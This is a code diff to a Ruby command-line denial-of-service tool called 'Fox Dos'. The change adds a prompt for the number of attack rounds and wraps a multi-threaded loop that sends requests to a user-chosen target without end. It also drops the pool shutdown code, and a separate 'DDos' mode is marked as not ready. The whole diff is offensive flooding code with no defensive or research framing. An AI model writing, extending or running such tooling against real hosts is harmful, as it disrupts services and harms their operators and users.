@@ -41,24 +41,25 @@ CLI::UI::Frame.open('Fox Dos') do
       # Number of threads to simulate multiple requests
       num_threads = CLI::UI.ask('Number of threads:', default: '10').to_i
 
+      # Attack number
+      attack_num = CLI::UI.ask('Number of attack:', default: '1').to_i
+
       # Create a thread pool
       pool = Concurrent::FixedThreadPool.new(num_threads)
 
       # Submit tasks to the thread pool
-      CLI::UI::Spinner.spin("Sending packets to #{target}: {{@widget/status:1:2:3:4}}") do |spinner|
-        num_threads.times do
-          pool.post do
-            loop do
-              send_request(target)
-              sleep 0.1 # Adjust the sleep interval as needed
+      for index in 1..attack_num do
+        CLI::UI::Spinner.spin("#{index}: Sending packets to #{target}: {{@widget/status:1:2:3:4}}") do |spinner|
+          num_threads.times do
+            pool.post do
+              loop do
+                send_request(target)
+                sleep 0.1 # Adjust the sleep interval as needed
+              end
             end
           end
         end
       end
-
-      # Shutdown the pool (this will not happen in this case)
-      #pool.shutdown
-      #pool.wait_for_termination
     end
   when 'DDos'
     puts CLI::UI.fmt "{{underline:The DDos mode is not ready.}}"
